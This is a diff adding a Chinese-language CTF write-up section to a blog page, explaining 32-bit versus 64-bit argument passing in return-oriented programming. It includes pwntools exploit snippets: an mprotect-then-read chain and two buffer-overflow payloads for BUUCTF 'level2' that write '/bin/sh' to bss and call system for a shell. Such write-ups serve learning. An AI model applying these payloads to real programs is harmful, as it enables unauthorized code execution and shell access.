@@ -339,6 +339,46 @@
 <p>2.32位调用函数压栈顺序是先压参数最后压返回函数，64位先是压入返回函数然后参数放寄存器，多于7个再压栈上</p>
 <p>以至于会有很多花样的问题</p>
 <p>我今天做的mprotect那道题里面的32位是用的寄存器，但是我发现有一个问题，他的传参方式又和64位相同了</p>
+<p>详细请见<a href="https://shijingtian.github.io/2020/09/08/cve/pwn-mprotect%E4%BF%AE%E6%94%B9%E6%89%A7%E8%A1%8C%E6%9D%83%E9%99%90/" target="_blank" rel="noopener">mprotect</a></p>
+<p>以下是部分代码</p>
+<pre><code>payload = 0x38*&quot;a&quot;  + p32(mprote) + p32(pop_3_addr) + p32(chan_addr_start) + p32(len_addr) + p32(7)            
+payload += p32(read_addr) + p32(pop_3_addr) + p32(0) + p32(chan_addr_start) + p32(len_addr) + p32(chan_addr_start)     
+p.sendline(payload)
+</code></pre><p>虽然类似，但是原理还是用的32位函数调用的原理，首先调用mprote然后pop作为返回值在栈顶，后面三个参数，这个函数用完之后跳到pop_3_addr的地址,pop自带ret，pop3次后取栈顶，此时为read，然后read同理，他依旧用的32位函数传参</p>
+<p>但是这道题目不能用平常普通的栈来传参，原因来看后面这道题目便可以解释清楚</p>
+<h2 id="题目：buuctf的level2"><a href="#题目：buuctf的level2" class="headerlink" title="题目：buuctf的level2"></a>题目：buuctf的level2</h2><p>很简单栈溢出然后read把/bin/sh放到bss里面调用system，system文件里调用了，原理很简单，下面看一下两个exp（这里只放关键部分）</p>
+<p><strong>exp1</strong></p>
+<pre><code>sys_addr = 0x08048320
+bss_addr = 0x0804A02C
+pop_3_ret = 0x08048519
+ret = 0x080482de
+pop_1_ret = 0x0804851b
+read_addr = elf.plt[&#39;read&#39;]
+payload = &quot;a&quot; * 0x8c + p32(read_addr) + p32(sys_addr) + p32(0) + p32(bss_addr) + p32(10) 
+p.recvuntil(&quot;Input:\n&quot;)
+p.sendline(payload)
+payload1 = &quot;/bin/sh&quot;
+p.sendline(payload1)
+</code></pre><p><strong>exp2</strong></p>
+<pre><code>sys_addr = 0x08048320
+bss_addr = 0x0804A02C
+pop_3_ret = 0x08048519
+ret = 0x080482de
+pop_1_ret = 0x0804851b
+read_addr = elf.plt[&#39;read&#39;]
+payload = &quot;a&quot; * 0x8c + p32(read_addr) + p32(pop_3_ret) + p32(0) + p32(bss_addr) + p32(10) + p32(sys_addr) +p32(ret/pop_1_ret/any_num) + p32(bss_addr)
+p.recvuntil(&quot;Input:\n&quot;)
+p.sendline(payload)
+payload1 = &quot;/bin/sh&quot;
+p.sendline(payload1)
+</code></pre><p>exp2是类似于64位的pop</p>
+<p>首先read，然后栈顶放pop地址</p>
+<p>pop完了之后栈顶位sys回归正常32位调用，但是栈顶应该是返回地址，必须有一个先放一个值在这里，没有意义也行,然后再去放参数，不然会把参数当成返回地址，然后参数就无效了。</p>
+<p>这里与64位不一样，他并不是pop放参数到寄存器，只是<strong>更换栈顶</strong>，实现<strong>栈的平衡</strong>而已。</p>
+<p>exp1是原始32位</p>
+<p>首先read，sys直接放栈顶，他并没有pop，所以在到sys的时候他的栈顶为后面的p32(0)+p32(bss_addr)+p32(10)</p>
+<p>然而巧合的是，按32位方式，正好先一个值做ret然后参数正好是bss值，直接成功，这里因为是read参数形式是这样所以成功，换成gets就不行了</p>
+<p>因此上面的问题也是这样，如果换成栈的方式，read后面的参数用的是之前mprotect的参数2参数3，肯定会报错，所以之前的也就不行了，问题解决，舒畅</p>
 
         </div>
         <!-- .entry-content -->
